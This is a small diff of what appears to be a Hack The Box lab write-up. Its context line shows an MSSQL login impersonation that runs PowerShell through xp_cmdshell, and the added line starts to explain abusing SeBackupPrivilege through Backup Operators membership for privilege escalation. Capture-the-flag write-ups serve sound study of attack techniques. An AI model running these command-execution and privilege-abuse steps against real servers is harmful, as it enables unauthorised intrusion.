@@ -253,6 +253,21 @@ HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'powershell -c "
 <img width="893" height="197" alt="image" src="https://github.com/user-attachments/assets/2660b938-45f1-4240-bd91-46ac375ab8ad" />
 
 
+> **`svc_wtbackup` is a member of the `Backup Operators` group, so we need to leverage the `SeBackupPrivilege` 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
